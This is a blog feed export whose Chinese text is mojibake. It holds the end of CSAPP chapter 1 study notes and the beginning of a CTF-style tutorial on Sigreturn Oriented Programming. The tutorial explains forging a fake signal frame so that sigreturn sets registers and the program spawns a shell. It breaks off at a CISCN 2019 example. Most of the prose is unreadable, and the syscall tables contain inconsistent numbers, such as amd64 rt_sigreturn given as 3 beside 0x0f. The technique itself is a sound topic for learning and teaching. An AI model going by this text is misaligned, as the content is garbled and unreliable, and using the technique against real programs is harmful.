title="æ“ä½œç³»ç»Ÿ"></a>æ“ä½œç³»ç»Ÿ</h1><p>æˆ‘ä»¬å¯ä»¥æŠŠæ“ä½œç³»ç»Ÿç†è§£ä¸ºåº”ç”¨ç¨‹åºå’Œç¡¬ä»¶ä¹‹é—´çš„ä¸€å±‚è½¯ä»¶ï¼Œæ‰€æœ‰åº”ç”¨å¯¹ç¡¬ä»¶çš„æ“ä½œå°è¯•éƒ½å¿…é¡»ç»è¿‡æ“ä½œç³»ç»Ÿã€‚</p><p>![](&#x2F;img&#x2F;CSAPP-ç¬¬ä¸€ç« -è®¡ç®—æœºç³»ç»Ÿæ¼«æ¸¸-æ€»ç»“&#x2F;1-æ“ä½œç³»ç»Ÿ .png)</p><p>æ“ä½œç³»ç»Ÿçš„åŠŸèƒ½ï¼š</p><ul><li><p>é˜²æ­¢ç¡¬ä»¶è¢«å¤±æ§çš„åº”ç”¨ç¨‹åºæ»¥ç”¨</p></li><li><p>å‘åº”ç”¨ç¨‹åºæä¾›ç®€å•ä¸€è‡´çš„æœºåˆ¶æ¥æ§åˆ¶ä½çº§ç¡¬ä»¶è®¾å¤‡</p></li></ul><p>æ“ä½œç³»ç»Ÿé€šè¿‡ä¸‰ä¸ªæŠ½è±¡æ¦‚å¿µæ¥å®ç°ä¸Šè¿°åŠŸèƒ½ï¼šè¿›ç¨‹ã€è™šæ‹Ÿå†…å­˜ã€æ–‡ä»¶</p><p>ä¸‰ä¸ªæ¦‚å¿µçš„å…³ç³»å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/1-%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E7%A1%AC%E4%BB%B6%E7%9A%84%E6%8A%BD%E8%B1%A1%E5%85%B3%E7%B3%BB.png"></p><h3 id="è¿›ç¨‹"><a href="#è¿›ç¨‹" class="headerlink" title="è¿›ç¨‹"></a>è¿›ç¨‹</h3><p><strong>è¿›ç¨‹</strong>æ˜¯æ“ä½œç³»ç»Ÿå¯¹æ­£åœ¨è¿è¡Œçš„ç¨‹åºçš„ä¸€ç§æŠ½è±¡ã€‚</p><p><strong>çº¿ç¨‹</strong>æ˜¯æ“ä½œç³»ç»Ÿèƒ½å¤Ÿè¿›è¡Œè¿ç®—è°ƒåº¦çš„æœ€å°å•ä½ã€‚å®ƒè¢«åŒ…å«åœ¨è¿›ç¨‹ä¹‹ä¸­ï¼Œæ˜¯è¿›ç¨‹ä¸­çš„å®é™…è¿ä½œå•ä½ã€‚ä¸€ä¸ªè¿›ç¨‹ç”±å¤šä¸ªçº¿ç¨‹ç»„æˆï¼Œæ¯ä¸ªçº¿ç¨‹éƒ½è¿è¡Œåœ¨è¿›ç¨‹çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œå…±äº«åŒæ ·çš„ä»£ç å’Œæ•°æ®ã€‚</p><p><strong>å¹¶å‘è¿è¡Œ</strong>æ˜¯æŒ‡ä¸€ä¸ªè¿›ç¨‹çš„æŒ‡ä»¤å’Œå¦ä¸€ä¸ªè¿›ç¨‹çš„æŒ‡ä»¤äº¤é”™æ‰§è¡Œï¼Œå¤šä¸ªè¿›ç¨‹åŒæ—¶æ´»åŠ¨ã€‚ä¸€ä¸ªCPUé€šè¿‡ä¸Šä¸‹æ–‡åˆ‡æ¢å®ç°å¹¶å‘æ‰§è¡Œå¤šä¸ªç¨‹åºã€‚</p><h3 id="è™šæ‹Ÿå†…å­˜"><a href="#è™šæ‹Ÿå†…å­˜" class="headerlink" title="è™šæ‹Ÿå†…å­˜"></a>è™šæ‹Ÿå†…å­˜</h3><p><strong>è™šæ‹Ÿå†…å­˜</strong>æ˜¯ä¸»å­˜å’ŒI&#x2F;Oè®¾å¤‡çš„æŠ½è±¡ï¼Œå®ƒä¸ºè¿›ç¨‹æä¾›ä¸€ç§ç‹¬ç«‹å ç”¨å†…å­˜çš„å‡è±¡ã€‚</p><p>æ¯ä¸ªè¿›ç¨‹çœ‹åˆ°çš„å†…å­˜éƒ½æ˜¯ä¸€è‡´çš„ï¼Œç§°ä¸º<strong>è™šæ‹Ÿåœ°å€ç©ºé—´</strong>ã€‚æ¯ä¸ªè¿›ç¨‹çœ‹åˆ°çš„è™šæ‹Ÿåœ°å€ç©ºé—´ç”±å¤§é‡å‡†ç¡®å®šä¹‰çš„åŒºæ„æˆï¼Œæ¯ä¸ªåŒºéƒ½æœ‰ä¸“é—¨çš„åŠŸèƒ½ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/1-%E8%BF%9B%E7%A8%8B%E7%9A%84%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4.png"></p><h4 id="æ–‡ä»¶"><a href="#æ–‡ä»¶" class="headerlink" title="æ–‡ä»¶"></a>æ–‡ä»¶</h4><p>æ–‡ä»¶å°±æ˜¯<strong>å­—èŠ‚åºåˆ—</strong>ï¼Œæ¯ä¸ªI&#x2F;Oè®¾å¤‡ï¼ŒåŒ…æ‹¬ç£ç›˜ã€é”®ç›˜ã€æ˜¾ç¤ºè®¾å¤‡ï¼Œç”šè‡³ç½‘ç»œéƒ½å¯çœ‹ä¸ºæ–‡ä»¶ã€‚</p><h1 id="é‡è¦æ¦‚å¿µ"><a href="#é‡è¦æ¦‚å¿µ" class="headerlink" title="é‡è¦æ¦‚å¿µ"></a>é‡è¦æ¦‚å¿µ</h1><h3 id="Amdahl-å®šå¾‹"><a href="#Amdahl-å®šå¾‹" class="headerlink" title="Amdahl å®šå¾‹"></a>Amdahl å®šå¾‹</h3><p>Amdahl å®šå¾‹ï¼ˆä¹Ÿå«é˜¿å§†è¾¾å°”å®šå¾‹ï¼‰ä¸»è¦æ€æƒ³æ˜¯ï¼Œå½“æˆ‘ä»¬å¯¹ç³»ç»Ÿçš„æŸä¸ªéƒ¨åˆ†åŠ é€Ÿæ—¶ï¼Œå…¶å¯¹ç³»ç»Ÿæ•´ä½“æ€§èƒ½çš„å½±å“å–å†³äºè¯¥éƒ¨åˆ†çš„é‡è¦æ€§å’ŒåŠ é€Ÿç¨‹åº¦ã€‚</p><p>æ‰€ä»¥ï¼Œ<strong>è¦æƒ³æ˜¾è‘—åŠ é€Ÿæ•´ä¸ªç³»ç»Ÿï¼Œå¿…é¡»æå‡å…¨ç³»ç»Ÿä¸­ç›¸å½“å¤§çš„éƒ¨åˆ†çš„é€Ÿåº¦</strong>ã€‚</p><h3 id="å¹¶è¡Œå’Œå¹¶å‘"><a href="#å¹¶è¡Œå’Œå¹¶å‘" class="headerlink" title="å¹¶è¡Œå’Œå¹¶å‘"></a>å¹¶è¡Œå’Œå¹¶å‘</h3><p><strong>å¹¶å‘</strong>æ˜¯æŒ‡ä¸€ä¸ªåŒæ—¶å…·æœ‰å¤šä¸ªæ´»åŠ¨çš„ç³»ç»Ÿã€‚</p><p><strong>å¹¶è¡Œ</strong>æ˜¯æŒ‡ç”¨å¹¶å‘æ¥ä½¿ä¸€ä¸ªç³»ç»Ÿè¿è¡Œå¾—æ›´å¿«ã€‚</p><h4 id="çº¿ç¨‹çº§å¹¶å‘"><a href="#çº¿ç¨‹çº§å¹¶å‘" class="headerlink" title="çº¿ç¨‹çº§å¹¶å‘"></a>çº¿ç¨‹çº§å¹¶å‘</h4><p>æ„å»ºåœ¨è¿›ç¨‹è¿™ä¸ªæŠ½è±¡ä¹‹ä¸Šï¼Œæˆ‘ä»¬èƒ½å¤Ÿè®¾è®¡å‡ºåŒæ—¶æœ‰å¤šä¸ªç¨‹åºæ‰§è¡Œçš„ç³»ç»Ÿï¼Œè¿™å°±å¯¼è‡´äº†å¹¶å‘ã€‚ä½¿ç”¨çº¿ç¨‹ï¼Œæˆ‘ä»¬ç”šè‡³èƒ½å¤Ÿåœ¨ä¸€ä¸ªè¿›ç¨‹ä¸­æ‰§è¡Œå¤šä¸ªæ§åˆ¶æµã€‚</p><p><strong>å¤šå¤„ç†å™¨ç³»ç»Ÿ</strong>æ˜¯ç”±å•æ“ä½œç³»ç»Ÿå†…æ ¸æ§åˆ¶çš„å¤šå¤„ç†å™¨ç»„æˆçš„ç³»ç»Ÿã€‚</p><p><strong>å¤šæ ¸å¤„ç†å™¨</strong>æ˜¯å°†å¤šä¸ªCPU(ç§°ä¸ºâ€æ ¸â€)é›†æˆåˆ°ä¸€ä¸ªé›†æˆç”µè·¯èŠ¯ç‰‡ä¸Šã€‚</p><p>è¶…çº¿ç¨‹ï¼Œæœ‰æ—¶ç§°ä¸º<strong>åŒæ—¶å¤šçº¿ç¨‹</strong>ï¼ˆsimultaneous multi-threadingï¼‰ï¼Œæ˜¯ä¸€é¡¹å…è®¸ä¸€ä¸ª CPU æ‰§è¡Œå¤šä¸ªæ§åˆ¶æµçš„æŠ€æœ¯ã€‚è¶…çº¿ç¨‹çš„å¤„ç†å™¨å¯ä»¥åœ¨å•ä¸ªå‘¨æœŸçš„åŸºç¡€ä¸Šå†³å®šè¦æ‰§è¡Œå“ªä¸€ä¸ªçº¿ç¨‹ï¼Œæ¯”å¦‚ï¼Œå‡è®¾ä¸€ä¸ªçº¿ç¨‹å¿…é¡»ç­‰åˆ°æŸäº›æ•°æ®è¢«è£…è½½åˆ°é«˜é€Ÿç¼“å­˜ä¸­ï¼Œé‚£åœ¨è¿™ä¸ªè£…åœ¨è¿‡ç¨‹ä¸­ï¼Œ CPU å°±å¯ä»¥ç»§ç»­å»æ‰§è¡Œå¦å¤–çš„ä¸€ä¸ªçº¿ç¨‹ã€‚</p><h4 id="æŒ‡ä»¤çº§å¹¶è¡Œ"><a href="#æŒ‡ä»¤çº§å¹¶è¡Œ" class="headerlink" title="æŒ‡ä»¤çº§å¹¶è¡Œ"></a>æŒ‡ä»¤çº§å¹¶è¡Œ</h4><p>ç°ä»£å¤„ç†å™¨å¯ä»¥åŒæ—¶æ‰§è¡Œå¤šæ¡æŒ‡ä»¤çš„å±æ€§ç§°ä¸ºæŒ‡ä»¤çº§å¹¶è¡Œã€‚</p><p><strong>è¶…æ ‡é‡å¤„ç†å™¨</strong>æ˜¯æŒ‡å¯ä»¥è¾¾åˆ°æ¯”ä¸€ä¸ªå‘¨æœŸä¸€æ¡æŒ‡ä»¤æ›´å¿«çš„æ‰§è¡Œé€Ÿç‡çš„å¤„ç†å™¨ã€‚</p><h4 id="å•æŒ‡ä»¤ã€å¤šæ•°æ®å¹¶è¡Œ"><a href="#å•æŒ‡ä»¤ã€å¤šæ•°æ®å¹¶è¡Œ" class="headerlink" title="å•æŒ‡ä»¤ã€å¤šæ•°æ®å¹¶è¡Œ"></a>å•æŒ‡ä»¤ã€å¤šæ•°æ®å¹¶è¡Œ</h4><p>å•æŒ‡ä»¤ã€å¤šæ•°æ®ï¼Œå³ SIMD å¹¶è¡Œï¼Œå°±æ˜¯è®¸å¤šç°ä»£å¤„ç†å™¨æ‹¥æœ‰ç‰¹æ®Šçš„ç¡¬ä»¶ï¼Œå…è®¸ä¸€æ¡æŒ‡ä»¤äº§ç”Ÿå¤šä¸ªå¯ä»¥å¹¶è¡Œæ‰§è¡Œçš„æ“ä½œã€‚</p><h3 id="è™šæ‹Ÿæœº"><a href="#è™šæ‹Ÿæœº" class="headerlink" title="è™šæ‹Ÿæœº"></a>è™šæ‹Ÿæœº</h3><p>è™šæ‹Ÿæœºæä¾›å¯¹æ•´ä¸ªè®¡ç®—æœºçš„æŠ½è±¡ï¼ŒåŒ…æ‹¬æ“ä½œç³»ç»Ÿã€å¤„ç†å™¨å’Œç¨‹åºã€‚</p><p>è™šæ‹Ÿæœºè¿™ä¸ªæŠ½è±¡æ¦‚å¿µä¸ä¹‹å‰çš„è¿›ç¨‹ã€è™šæ‹Ÿå†…å­˜å’Œæ–‡ä»¶çš„æŠ½è±¡æ¦‚å¿µå…³ç³»å¦‚ä¸‹å›¾ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/1-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%8F%90%E4%BE%9B%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%BD%E8%B1%A1.png"></p><hr><p>ä¹‹å‰ä¸€ç›´åœ¨<del>å¿«ä¹æš‘å‡æ‘†çƒ‚</del> åˆ°å¤„åƒå¸­ï¼Œç»ˆäºè¦å¼€å§‹æ¢å¤å­¦ä¹ çŠ¶æ€è¾£ğŸ¤ª</p>]]></content>
    
    
    <categories>
      
      <category>è¯»ä¹¦ç¬”è®°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SROP</title>
    <link href="/2023/08/15/SROP/"/>
    <url>/2023/08/15/SROP/</url>
    
    <content type="html"><![CDATA[<p> Sigreturn Oriented Programming (SROP)ï¼Œé¢å‘ Sigreturn çš„ç¼–ç¨‹ </p><span id="more"></span><h1 id="signal-æœºåˆ¶"><a href="#signal-æœºåˆ¶" class="headerlink" title="signal æœºåˆ¶"></a>signal æœºåˆ¶</h1><h3 id="Signal-handing"><a href="#Signal-handing" class="headerlink" title="Signal handing"></a>Signal handing</h3><p>ä¿¡å·å¤„ç†ï¼ˆSignal handingï¼‰æ˜¯ UNIX ç³»ç»Ÿä¸­è¿›ç¨‹ç›¸äº’é€šä¿¡çš„ä¸€ç§æœºåˆ¶ã€‚ åœ¨ä¿¡å·å¤„ç†è¿‡ç¨‹ä¸­ï¼Œé¦–å…ˆä¼šä¿å­˜å½“å‰è¿›ç¨‹çš„ä¸Šä¸‹æ–‡ï¼Œç„¶åæ‰§è¡Œä¿¡å·å¤„ç†ç¨‹åºï¼Œæœ€åæ¢å¤ä¸Šä¸‹æ–‡å¹¶ç»§ç»­æ­£å¸¸æ‰§è¡Œã€‚</p><p>SROP æœ¬è´¨æ˜¯ sigreturn è¿™ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œä¸»è¦æ˜¯å°†æ‰€æœ‰å¯„å­˜å™¨å‹å…¥æ ˆä¸­ï¼Œä»¥åŠå‹å…¥ signal ä¿¡æ¯ï¼Œä»¥åŠæŒ‡å‘ sigreturn çš„ç³»ç»Ÿè°ƒç”¨åœ°å€ã€‚</p><h3 id="context"><a href="#context" class="headerlink" title="context"></a>context</h3><p>å¯¹äºä¿¡å·å¸§ï¼ˆsignal Frameï¼‰æ¥è¯´ï¼Œä¼šå› ä¸ºæ¶æ„çš„ä¸åŒè€Œæœ‰æ‰€åŒºåˆ«ã€‚ä»¥ä¸‹åˆ†åˆ«ç»™å‡º 32 ä½å’Œ 64 ä½çš„ sigcontext ï¼š</p><ul><li>32ä½</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigcontext</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> gs, __gsh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> fs, __fsh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> es, __esh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> ds, __dsh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> edi;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> esi;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ebp;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> esp;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ebx;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> edx;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ecx;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> eax;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> trapno;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> err;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> eip;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> cs, __csh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> eflags;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> esp_at_signal;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> ss, __ssh;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">fpstate</span> * <span class="hljs-title">fpstate</span>;</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> oldmask;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> cr2;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>64ä½</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">fpstate</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* FPU environment matching the 64-bit FXSAVE layout.  */</span><br>  <span class="hljs-type">__uint16_t</span>        cwd;<br>  <span class="hljs-type">__uint16_t</span>        swd;<br>  <span class="hljs-type">__uint16_t</span>        ftw;<br>  <span class="hljs-type">__uint16_t</span>        fop;<br>  <span class="hljs-type">__uint64_t</span>        rip;<br>  <span class="hljs-type">__uint64_t</span>        rdp;<br>  <span class="hljs-type">__uint32_t</span>        mxcsr;<br>  <span class="hljs-type">__uint32_t</span>        mxcr_mask;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">fpxreg</span>    _<span class="hljs-title">st</span>[8];</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">xmmreg</span>    _<span class="hljs-title">xmm</span>[16];</span><br>  <span class="hljs-type">__uint32_t</span>        padding[<span class="hljs-number">24</span>];<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigcontext</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">__uint64_t</span> r8;<br>  <span class="hljs-type">__uint64_t</span> r9;<br>  <span class="hljs-type">__uint64_t</span> r10;<br>  <span class="hljs-type">__uint64_t</span> r11;<br>  <span class="hljs-type">__uint64_t</span> r12;<br>  <span class="hljs-type">__uint64_t</span> r13;<br>  <span class="hljs-type">__uint64_t</span> r14;<br>  <span class="hljs-type">__uint64_t</span> r15;<br>  <span class="hljs-type">__uint64_t</span> rdi;<br>  <span class="hljs-type">__uint64_t</span> rsi;<br>  <span class="hljs-type">__uint64_t</span> rbp;<br>  <span class="hljs-type">__uint64_t</span> rbx;<br>  <span class="hljs-type">__uint64_t</span> rdx;<br>  <span class="hljs-type">__uint64_t</span> rax;<br>  <span class="hljs-type">__uint64_t</span> rcx;<br>  <span class="hljs-type">__uint64_t</span> rsp;<br>  <span class="hljs-type">__uint64_t</span> rip;<br>  <span class="hljs-type">__uint64_t</span> eflags;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> cs;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> gs;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> fs;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> __pad0;<br>  <span class="hljs-type">__uint64_t</span> err;<br>  <span class="hljs-type">__uint64_t</span> trapno;<br>  <span class="hljs-type">__uint64_t</span> oldmask;<br>  <span class="hljs-type">__uint64_t</span> cr2;<br>  __extension__ <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">    &#123;</span><br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">fpstate</span> * <span class="hljs-title">fpstate</span>;</span><br>      <span class="hljs-type">__uint64_t</span> __fpstate_word;<br>    &#125;;<br>  <span class="hljs-type">__uint64_t</span> __reserved1 [<span class="hljs-number">8</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><p>ä¿¡å·å¸§éƒ½ä¼šè¢«ç›´æ¥å‹å…¥å †æ ˆä¸­å­˜å‚¨ï¼Œå¦‚ä¸‹å›¾ä¸­ siginfo å’Œ ucontext ç»„æˆä¿¡å·å¸§</p><p><img src="D:/ç¬”è®°/PWN/SROP/æ ˆç»“æ„.png"></p><p>ç®€è€Œè¨€ä¹‹ï¼Œ</p><p>åœ¨è¿è¡Œä¿¡å·å¤„ç†ç¨‹åºä¹‹å‰â€”â€”ä¸Šä¸‹æ–‡è¢«æ¨å…¥å †æ ˆ<br>å®Œæˆæ‰§è¡Œä¿¡å·å¤„ç†ç¨‹åºåâ€”â€”ä¸Šä¸‹æ–‡å°†ä»å †æ ˆä¸­å¼¹å‡º</p><h3 id="sigreturn"><a href="#sigreturn" class="headerlink" title="sigreturn"></a>sigreturn</h3><p>æœ€é‡è¦çš„æ˜¯ sigreturn éƒ¨åˆ†ï¼Œsignal handler è¿”å›åï¼Œå†…æ ¸ä¸ºæ‰§è¡Œ sigreturn ç³»ç»Ÿè°ƒç”¨ï¼Œè¦æ¢å¤ä¹‹å‰ä¿å­˜çš„ä¸Šä¸‹æ–‡ï¼Œå…¶ä¸­åŒ…æ‹¬å°†æ‰€æœ‰å‹å…¥çš„å¯„å­˜å™¨ï¼Œé‡æ–° pop å›å¯¹åº”çš„å¯„å­˜å™¨ï¼Œæœ€åæ¢å¤è¿›ç¨‹çš„æ‰§è¡Œã€‚å®ƒä¸æ£€æŸ¥ä¸Šä¸‹æ–‡ä¸­æ ˆçš„å®Œæ•´æ€§ï¼Œåªæ˜¯ç®€å•çš„å¡«å……å¯¹åº”çš„å†…å®¹åˆ°ç›¸åº”çš„å¯„å­˜å™¨ä¸­ã€‚</p><p><img src="/img/SROP/sigreturn.png"></p><p>è¿™å°±æ„å‘³ç€æˆ‘ä»¬åªè¦æŠŠæƒ³è¦çš„å€¼å¡«è¿›å¯„å­˜å™¨ï¼Œå½“ç³»ç»Ÿæ‰§è¡Œå®Œ sigreturn ç³»ç»Ÿè°ƒç”¨ä¹‹åï¼Œä¼šæ‰§è¡Œä¸€ç³»åˆ—çš„ pop æŒ‡ä»¤ä»¥ä¾¿äºæ¢å¤ç›¸åº”å¯„å­˜å™¨çš„å€¼ï¼Œå½“æ‰§è¡Œåˆ° rip æ—¶ï¼Œå°±ä¼šå°†ç¨‹åºæ‰§è¡ŒæµæŒ‡å‘ syscall åœ°å€ï¼Œæ ¹æ®ç›¸åº”å¯„å­˜å™¨çš„å€¼ï¼Œæ­¤æ—¶ï¼Œä¾¿ä¼šå¾—åˆ°ä¸€ä¸ª shellï¼Œè¾¾åˆ°æƒ³è¦çš„æ•ˆæœã€‚</p><p>å…¶ä¸­ï¼Œ32 ä½çš„ sigreturn çš„è°ƒç”¨å·ä¸º 77ï¼Œ64 ä½çš„ç³»ç»Ÿè°ƒç”¨å·ä¸º 15ã€‚</p><h1 id="åˆ©ç”¨æ–¹æ³•"><a href="#åˆ©ç”¨æ–¹æ³•" class="headerlink" title="åˆ©ç”¨æ–¹æ³•"></a>åˆ©ç”¨æ–¹æ³•</h1><h3 id="SROPç‰¹ç‚¹"><a href="#SROPç‰¹ç‚¹" class="headerlink" title="SROPç‰¹ç‚¹"></a>SROPç‰¹ç‚¹</h3><ul><li><p>ä¾èµ–ç³»ç»Ÿè°ƒç”¨ï¼ˆsyscallï¼‰å¼ºä½†å¯¹ libc.so çš„ä¾èµ–æå°‘ã€‚</p></li><li><p>è¦æœ‰ç©ºé—´å­˜æ”¾ Signal Frame çš„ä¿¡æ¯.</p></li><li><p>ä¸å…¶ä»– rop ç›¸æ¯”ï¼Œå¯¹çš„ä¾èµ– gadgets è¾ƒå°‘ã€‚</p></li></ul><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>å½“æ¯æ¬¡ syscall è¿”å›çš„æ—¶å€™ï¼Œæ ˆæŒ‡é’ˆéƒ½ä¼šæŒ‡å‘ä¸‹ä¸€ä¸ª Signal Frameã€‚å› æ­¤å°±å¯ä»¥æ‰§è¡Œä¸€ç³»åˆ—çš„ sigreturn å‡½æ•°è°ƒç”¨ã€‚å› æ­¤æˆ‘ä»¬å°±å¯ä»¥åœ¨ç¨‹åºæŸä¸€ä¸ªåœ°æ–¹ä¼ªé€ ä¸€ä¸ª <code>signal Frame</code> ï¼Œå†è®©ç¨‹åº <code>sys_rt_sigreturn</code> æˆ‘ä»¬æ„é€ çš„ fake signal Frameï¼Œè®©è¿›ç¨‹æ¢å¤åˆ°æˆ‘ä»¬æ„é€ çš„æ¶æ„çŠ¶æ€ã€‚</p><p><img src="/img/SROP/system_call_chains.png"></p><p>åˆ©ç”¨çš„å‰ææ˜¯ç›®æ ‡ç¨‹åºä¸­å­˜åœ¨ sigreturnç‰‡æ®µä¹Ÿå°±æ˜¯ <code>syscall;ret;</code> ä»£ç æ®µï¼Œæˆ‘ä»¬ç›´æ¥å‘æ ˆä¸Šå†™å…¥ Signal Frame å³å¯ã€‚</p><p>ä»¥ä¸‹æ˜¯å¸¸ç”¨çš„ç³»ç»Ÿè°ƒç”¨å·ï¼š</p><ul><li>i386</li></ul><table><thead><tr><th align="center">NR</th><th align="center">syscall name</th><th align="center">%eax</th><th align="center">arg0 (%ebx)</th><th align="center">arg1 (%ecx)</th><th align="center">arg2 (%edx)</th></tr></thead><tbody><tr><td align="center">3</td><td align="center">read</td><td align="center">0x03</td><td align="center">unsigned int fd</td><td align="center">char *buf</td><td align="center">size_t count</td></tr><tr><td align="center">4</td><td align="center">write</td><td align="center">0x04</td><td align="center">unsigned int fd</td><td align="center">const char *buf</td><td align="center">size_t count</td></tr><tr><td align="center">5</td><td align="center">open</td><td align="center">0x05</td><td align="center">const char *filename</td><td align="center">int flags</td><td align="center">umode_t mode</td></tr><tr><td align="center">11</td><td align="center">execve</td><td align="center">0x0b</td><td align="center">const char *filename</td><td align="center">char *const *argv</td><td align="center">char *const *envp</td></tr><tr><td align="center">173</td><td align="center">rt_sigreturn</td><td align="center">0xad</td><td align="center">?</td><td align="center">?</td><td align="center">?</td></tr></tbody></table><ul><li>amd64</li></ul><table><thead><tr><th align="center">NR</th><th align="center">syscall name</th><th align="center">%rax</th><th align="center">arg0 (%rdi)</th><th align="center">arg1 (%rsi)</th><th align="center">arg2 (%rdx)</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">read</td><td align="center">0x00</td><td align="center">unsigned int fd</td><td align="center">char *buf</td><td align="center">size_t count</td></tr><tr><td align="center">1</td><td align="center">write</td><td align="center">0x01</td><td align="center">unsigned int fd</td><td align="center">const char *buf</td><td align="center"></td></tr><tr><td align="center">2</td><td align="center">open</td><td align="center">0x02</td><td align="center">const char *filename</td><td align="center">int flags</td><td align="center">umode_t mode</td></tr><tr><td align="center">3</td><td align="center">rt_sigreturn</td><td align="center">0x0f</td><td align="center">?</td><td align="center">?</td><td align="center">?</td></tr><tr><td align="center">59</td><td align="center">execve</td><td align="center">0x3b</td><td align="center">const char *filename</td><td align="center">char *const *argv</td><td align="center">char *const *envp</td></tr></tbody></table><h1 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h1><h4 id="CISCN-2019åå—-PWN3"><a href="#CISCN-2019åå—-PWN3" class="headerlink" title="[CISCN 2019åå—] PWN3"></a>[CISCN 2019åå—] PWN3</h4><p>é¢˜ç›®é“¾æ¥ï¼š<a 